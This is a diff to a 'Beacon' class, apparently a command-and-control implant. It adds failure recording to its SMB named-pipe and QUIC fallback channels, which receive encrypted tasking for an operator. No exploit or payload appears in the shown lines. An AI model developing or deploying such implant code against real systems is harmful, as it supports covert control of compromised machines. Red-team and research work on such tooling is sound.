@@ -5086,6 +5086,10 @@ class Beacon:
                 return None
             resp_data = self._smb_read_pipe(sock)
             if not resp_data:
+                # Same hole QUIC had: the pipe was written and answered
+                # nothing, which raises no exception, so this leg used to
+                # record nothing and packed as `not_attempted`.
+                self._record_leg("smb", _RESCUE_CLASSES["timed_out"])
                 return None
             try:
                 return self._decrypt(resp_data.decode() if isinstance(resp_data, bytes) else resp_data)
@@ -5093,9 +5097,14 @@ class Beacon:
                 # This used to fall back to json.loads(resp_data), accepting
                 # unencrypted tasking from anything on the pipe. A response
                 # that does not decrypt is a failed exchange.
+                self._record_leg("smb", _RESCUE_CLASSES["bad_payload"])
                 return None
         except Exception as e:
             logger.debug("SMB beacon failed: %s", e)
+            # HTTPS and QUIC both recorded from their except branch; SMB
+            # recorded only its connect failure, so everything that went
+            # wrong after a successful connect was invisible.
+            self._record_leg("smb", _rescue_class_of(e))
             return None
         finally:
             try:
@@ -5182,6 +5191,15 @@ class Beacon:
             sock.close()
 
             if not fragments or (expected and len(fragments) < expected):
+                # Nothing usable came back, and no exception was raised to
+                # say so: an unconnected UDP socket does not get the ICMP
+                # port-unreachable delivered on Linux, so a dead endpoint
+                # is a plain timeout. Found in the VM -- this leg used to
+                # record only from the except branch below, so the quiet
+                # path left the record empty and it packed as
+                # `not_attempted`. The operator was told "QUIC: not tried"
+                # about a leg that was tried and timed out.
+                self._record_leg("quic", _RESCUE_CLASSES["timed_out"])
                 return None
 
             reassembled = b""
@@ -5197,7 +5215,9 @@ class Beacon:
                 # This used to fall back to json.loads(resp_payload),
                 # accepting unencrypted tasking from any UDP sender that
                 # answered. A response that does not decrypt is a failed
-                # exchange.
+                # exchange -- and one worth telling the operator about,
+                # because something on that port answered.
+                self._record_leg("quic", _RESCUE_CLASSES["bad_payload"])
                 return None
         except Exception as e:
             logger.debug("QUIC beacon failed: %s", e)
